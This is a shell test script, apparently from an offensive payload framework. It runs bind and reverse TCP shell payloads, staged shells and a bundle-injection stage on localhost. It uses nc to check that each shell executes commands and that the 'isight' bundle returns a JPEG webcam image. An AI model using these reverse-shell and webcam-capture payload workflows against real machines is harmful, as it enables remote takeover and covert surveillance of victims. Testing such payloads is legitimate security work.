#!/bin/sh

LPORT=13330

function run_payload()
{
    ./test_component $1 &
    sleep 1
}


function test_single_bind_tcp_shell()
{
    run_payload ../../bin/single_bind_tcp_shell.bin

    echo "expr 1234 + 5678" | nc -4 -vv -w 5 localhost $LPORT | grep "6912"

    wait
    
    return $?
}

function test_single_reverse_tcp_shell()
{
    (echo "expr 1234 + 5678" | nc -4 -vv -w 5 -l localhost $LPORT | grep "6912"; RESULT=$?) &
    
    sleep 1
    
    (./test_component ../../bin/single_reverse_tcp_shell.bin)

    wait
    
    return $RESULT
}

function test_staged_bind_tcp_shell()
{
    run_payload ../../bin/stager_bind_tcp.bin

    (./write_size_and_data.rb ../../bin/stage_shell.bin ; echo "expr 1234 + 5678" ) | nc -4 -vv -w 5 localhost $LPORT | grep "6912"

    wait
    
    return $?
}

function test_staged_reverse_tcp_shell()
{
    ((./write_size_and_data.rb ../../bin/stage_shell.bin; echo "expr 1234 + 5678" ) | nc -4 -vv -w 5 -l localhost $LPORT | grep "6912"; RESULT=$?) &
    
    sleep 1
    
    ./test_component ../../bin/stager_reverse_tcp.bin

    wait
    
    return $RESULT
}

function test_staged_bind_tcp_bundleinject()
{
    # Setup
    run_payload ../../bin/stager_bind_tcp.bin

    # Test
    TMPFILE=`mktemp isightXXXXXX` || exit 1
    ( ./write_size_and_data.rb ../../bin/stage_bundleinject.bin ; ./write_size_and_data.rb ../../../../bundles/isight/isight.bundle ) | nc -4 -vv -w 5 localhost $LPORT | (dd bs=1 skip=4 of=$TMPFILE)

    # Verify
    file $TMPFILE | grep JPEG
    RESULT=$?

    # Cleanup
    rm $TMPFILE

    wait

    return $RESULT
}

function test_staged_reverse_tcp_bundleinject()
{
    # Setup
    TMPFILE=`mktemp isightXXXXXX` || exit 1
    
    (( ./write_size_and_data.rb ../../bin/stage_bundleinject.bin ; ./write_size_and_data.rb ../../../../bundles/isight/isight.bundle ) | nc -4 -vv -l -w 5 localhost $LPORT | dd bs=1 skip=4 of=$TMPFILE) &
    sleep 1

    run_payload ../../bin/stager_reverse_tcp.bin

    wait

    # Verify
    file $TMPFILE | grep JPEG
    RESULT=$?

    if [ $RESULT -eq 0 ]; then
        # Cleanup
	rm $TMPFILE
    fi

    return $RESULT
}

SLEEP=65

echo "==> Testing single_reverse_tcp_shell..."
test_single_reverse_tcp_shell || exit 1
echo "Sleeping $SLEEP seconds..."
sleep $SLEEP

echo "==> Testing single_bind_tcp_shell..."
test_single_bind_tcp_shell || exit 1
echo "Sleeping $SLEEP seconds..."
sleep $SLEEP

echo "==> Testing stager_bind_tcp + stage_shell..."
test_staged_bind_tcp_shell || exit 1
echo "Sleeping $SLEEP seconds..."
sleep $SLEEP

echo "==> Testing stager_reverse_tcp + stage_shell..."
test_staged_reverse_tcp_shell || exit 1
echo "Sleeping $SLEEP seconds..."
sleep $SLEEP

echo "==> Testing stager_bind_tcp + bundleinject + isight.bundle..."
test_staged_bind_tcp_bundleinject || exit 1
echo "Sleeping $SLEEP seconds..."
sleep $SLEEP

echo "==> Testing stager_reverse_tcp + bundleinject + isight.bundle..."
test_staged_reverse_tcp_bundleinject || exit 1
echo "Sleeping $SLEEP seconds..."

echo
echo "==> All tests passed successfully!"
echo
